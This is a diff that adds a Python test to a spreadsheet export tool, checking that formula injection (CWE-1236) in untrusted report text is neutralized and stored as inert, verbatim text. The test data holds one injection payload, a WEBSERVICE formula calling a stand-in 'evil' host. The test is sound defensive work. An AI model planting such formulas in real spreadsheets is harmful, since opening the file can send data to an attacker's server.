@@ -284,6 +284,41 @@ def test_main_unreadable_snapshot_dir_returns_nonzero(tmp_path):
     assert rc != 0
 
 
+def test_formula_injection_neutralized_in_data_cells(tmp_path):
+    # CWE-1236: `quote` is verbatim third-party report text we don't control.
+    # openpyxl types a leading "=" string as a live formula; Excel also treats
+    # leading + - @ as formula triggers. A malicious snapshot value must land
+    # as inert text on reload, not as a formula that executes on open — and
+    # the exact text must still be preserved (this is a provenance tool).
+    pytest.importorskip("openpyxl")
+    malicious = '=WEBSERVICE("http://evil")'
+    benign = "circular revenues were 18% of sales"
+    rows = [
+        {"entity": "X", "domain": "circular", "indicator": "i1", "value": "18",
+         "period": "2022", "status": "found", "quote": malicious},
+        {"entity": "X", "domain": "circular", "indicator": "i2", "value": "25",
+         "period": "2025", "status": "target", "quote": benign},
+    ]
+    columns = ["entity", "domain", "indicator", "value", "period", "status", "quote"]
+    wb = export_xlsx.build_workbook(columns, rows)
+    out = tmp_path / "injection.xlsx"
+    wb.save(str(out))
+
+    from openpyxl import load_workbook
+    reloaded = load_workbook(str(out))["Data"]
+    c = _col_idx(reloaded, "quote")
+
+    malicious_cell = reloaded.cell(row=2, column=c)
+    assert malicious_cell.data_type != "f", \
+        "malicious quote reloaded as a live formula — CWE-1236 not fixed"
+    assert malicious_cell.value == malicious, \
+        "malicious quote value must round-trip verbatim (provenance tool)"
+
+    benign_cell = reloaded.cell(row=3, column=c)
+    assert benign_cell.data_type != "f"
+    assert benign_cell.value == benign
+
+
 def test_main_missing_openpyxl_returns_nonzero_with_hint(tmp_path, capsys, monkeypatch):
     # NOT importorskip-guarded: monkeypatching sys.modules forces ImportError,
     # so this exercises the missing-dep path whether or not openpyxl is installed.
